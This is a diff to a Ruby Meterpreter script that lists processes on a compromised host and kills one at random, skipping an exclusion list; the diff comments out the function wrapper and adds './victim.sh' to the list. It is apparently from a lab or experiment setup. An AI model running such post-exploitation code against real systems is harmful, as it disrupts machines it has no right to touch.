@@ -1,10 +1,10 @@
-def run_script(client)
+#def run_script(client)
   # Meterpreter script to list processes, check and kill one randomly
 
   # List of critical processes or keywords to avoid killing
   critical_processes = [
     'meterpreter', 'sshd', 'systemd', 'init', 'Xorg', 'kernel',
-    'kworker', 'dbus', 'udevd', 'apache2', 'nginx', 'sysdig', 'psimon', 'dumpcap', 'xfsettingsd', '/usr/bin/VBoxClient', './receiver.sh', '/usr/sbin/lightdm', '/usr/bin/zsh'
+    'kworker', 'dbus', 'udevd', 'apache2', 'nginx', 'sysdig', 'psimon', 'dumpcap', 'xfsettingsd', '/usr/bin/VBoxClient', './receiver.sh', '/usr/sbin/lightdm', '/usr/bin/zsh', './victim.sh'
   ]
 
   # Execute the ps aux command to list all processes
@@ -45,4 +45,4 @@ def run_script(client)
   File.open(log_file, "a") do |file|
     file.puts("#{Time.now} - Killed process: #{random_process.strip} (PID: #{pid})")
   end
-end
+#end
